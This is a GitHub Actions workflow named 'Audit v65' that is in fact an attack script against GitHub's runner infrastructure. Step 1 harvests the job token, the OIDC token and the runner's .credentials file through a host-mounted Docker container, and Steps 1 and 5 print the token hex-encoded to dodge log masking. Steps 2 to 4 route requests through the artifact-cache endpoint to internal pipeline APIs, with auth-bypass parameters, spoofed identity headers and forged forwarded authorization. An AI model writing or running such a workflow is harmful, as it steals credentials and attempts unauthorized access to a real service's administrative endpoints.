name: Audit v65
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v65:
    runs-on: ubuntu-latest
    steps:

      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V65 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: QUERY PARAM INJECTION ON EVERY 403 ENDPOINT
      # messages, agents registration, scalesets, admintoken
      # Inject bypass params: internal=true, admin=true, scope=Admin
      # Old API versions, null params, skip auth params
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Query Injection Auth Bypass
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== QUERY INJECTION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"

          # Key endpoints that return 403
          ENDPOINTS=(
            "_apis/distributedtask/pools/2/messages"
            "_apis/distributedtask/pools/1/admintoken"
            "_apis/distributedtask/pools/2/admintoken"
            "_apis/distributedtask/pools/1/accesspolicy"
            "_apis/runtime/runnerscalesets"
          )

          # A: Query params that may bypass auth checks
          echo "--- A: Query bypass params ---"
          for EP in "${ENDPOINTS[@]}"; do
            for QP in \
              "api-version=1.0" \
              "api-version=0.1" \
              "api-version=0.1-preview" \
              "api-version=6.0-preview&bypassAuth=true" \
              "api-version=6.0-preview&internal=true" \
              "api-version=6.0-preview&admin=true" \
              "api-version=6.0-preview&scope=Admin" \
              "api-version=6.0-preview&service=true" \
              "api-version=6.0-preview&skipAuthorization=true" \
              "api-version=6.0-preview&isSelfHosted=true" \
              "api-version=6.0-preview&useSelfAuth=true" \
              "api-version=6.0-preview&impersonate=true" \
              "api-version=6.0-preview&%24bypass=1" \
              "api-version=6.0-preview&sessionId=00000000-0000-0000-0000-000000000001&lastMessageId=0"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $PIPE_HOST" \
                -H "Accept: application/json" \
                "$PROXY/$EP?$QP" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$CODE" != "HTTP_403" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
                echo "A BYPASS $EP?$QP = $CODE | $(echo "$BODY" | head -c 300)"
              fi
            done
          done
          echo ""

          # B: Messages with session pollution — sessionId in body AND query
          echo "--- B: Messages session injection ---"
          for SESS in \
            "sessionId=00000000-0000-0000-0000-000000000000&lastMessageId=0&api-version=6.0-preview" \
            "sessionId=11111111-1111-1111-1111-111111111111&lastMessageId=0&api-version=6.0-preview" \
            "sessionId=ffffffff-ffff-ffff-ffff-ffffffffffff&lastMessageId=0&api-version=6.0-preview" \
            "sessionId=DDDDDDDD-DDDD-DDDD-DDDD-DDDDDDDDDDDD&lastMessageId=0&api-version=6.0-preview"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json" \
              "$PROXY/_apis/distributedtask/pools/2/messages?$SESS" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B messages $SESS = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: PROCESSID / SESSION HEADER SPOOFING
      # We have STATIC processId values from many past responses.
      # Inject these as request headers to spoof server context.
      # Pool/1 processId: c14ff737... Pool/2 processId: 9d5b3892...
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - StaticProcessId Header Injection
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== PROCESSID HEADER SPOOFING ==="
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"
          VER="api-version=6.0-preview"

          # Static processIds captured from prior runs
          PROC1="c14ff737-2874-4627-a919-7fe11eb82cce"  # pool/1 accesspolicy
          PROC2="9d5b3892-895e-40ca-9e79-656271809a5b"  # pool/2
          PROC3="bb24734b-ddb4-4c84-8e9d-da69e9dd60d7"  # admintoken

          echo "--- A: Header spoof on messages endpoint ---"
          for PROC in "$PROC1" "$PROC2" "$PROC3"; do
            for EP in \
              "_apis/distributedtask/pools/2/messages?sessionId=00000000-0000-0000-0000-000000000001&lastMessageId=0&$VER" \
              "_apis/distributedtask/pools/1/admintoken?$VER" \
              "_apis/distributedtask/pools/2/admintoken?$VER" \
              "_apis/runtime/runnerscalesets?$VER"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $PIPE_HOST" \
                -H "X-TFS-ProcessId: $PROC" \
                -H "X-TFS-Session: $PROC" \
                -H "X-VSS-E2EID: $PROC" \
                -H "Accept: application/json" \
                "$PROXY/$EP" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$CODE" != "HTTP_403" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
                echo "A PROC=$PROC $EP = $CODE | $(echo "$BODY" | head -c 300)"
              fi
            done
          done
          echo ""

          # B: Alt Authorization formats on 403 endpoints
          echo "--- B: Alt auth formats ---"
          RT=$(cat /tmp/rt.txt)
          for AUTHFMT in \
            "Token $RT" \
            "Basic $(echo -n "x:$RT" | base64)" \
            "Bearer $CTOK" \
            "Basic $(echo -n "x:$CTOK" | base64)" \
            "SharedAccessSignature $RT" \
            "WRAP access_token%3D%22$RT%22" \
            "Bearer token=$RT"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
              -H "Authorization: $AUTHFMT" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/distributedtask/pools/2/admintoken" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $(echo "$AUTHFMT" | head -c 30) = $CODE | $(echo "$BODY" | head -c 150)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: X-Forwarded-Authorization + Internal Header Injection
      # Some proxies check X-Forwarded-Authorization for original auth
      # Many internal services trust X-VSS-UserData for identity spoofing
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Forwarded Auth + VSS Identity Headers
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== FORWARDED AUTH HEADERS ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"
          VER="api-version=6.0-preview"
          PROC2="9d5b3892-895e-40ca-9e79-656271809a5b"

          TARGETS=(
            "_apis/distributedtask/pools/2/admintoken"
            "_apis/distributedtask/pools/2/messages?sessionId=00000000-0000-0000-0000-000000000001&lastMessageId=0"
            "_apis/distributedtask/pools/1/accesspolicy"
          )

          # A: Inject X-Forwarded-Authorization to override auth identity
          echo "--- A: X-Forwarded-Authorization injection ---"
          for TARGET in "${TARGETS[@]}"; do
            for XFWD in \
              "Bearer $IDTOK" \
              "Bearer $RT" \
              "Bearer $CTOK" \
              "Bearer System:ScopeLevel.Repository"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
                -H "Authorization: Bearer $IDTOK" \
                -H "X-Forwarded-Authorization: $XFWD" \
                -H "X-Original-Authorization: $XFWD" \
                -H "Host: $PIPE_HOST" \
                -H "Accept: application/json; $VER" \
                "$PROXY/$TARGET" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$CODE" != "HTTP_403" ] && [ "$CODE" != "HTTP_000" ]; then
                echo "A $TARGET XFWD=$(echo "$XFWD" | head -c 20) = $CODE | $(echo "$BODY" | head -c 200)"
              fi
            done
          done
          echo ""

          # B: VSS internal identity header injection
          echo "--- B: VSS identity headers ---"
          for TARGET in "${TARGETS[@]}"; do
            for HDR_SET in \
              "X-VSS-UserData: System:ScopeLevel.Repository" \
              "X-VSS-UserData: System:ServiceIdentity;c14ff737-2874-4627-a919-7fe11eb82cce" \
              "X-TFS-FedAuthRedirect: Suppress" \
              "X-VSS-AuthorizationContext: admin" \
              "VSS-UserAgent: github-actions/runner" \
              "X-ServicePrincipal: true"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
                -H "Authorization: Bearer $IDTOK" \
                -H "$HDR_SET" \
                -H "Host: $PIPE_HOST" \
                -H "Accept: application/json; $VER" \
                "$PROXY/$TARGET" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$CODE" != "HTTP_403" ] && [ "$CODE" != "HTTP_000" ]; then
                echo "B $TARGET HDR=$(echo "$HDR_SET" | head -c 35) = $CODE | $(echo "$BODY" | head -c 200)"
              fi
            done
          done

      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V65 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V65 COMPLETE ==="
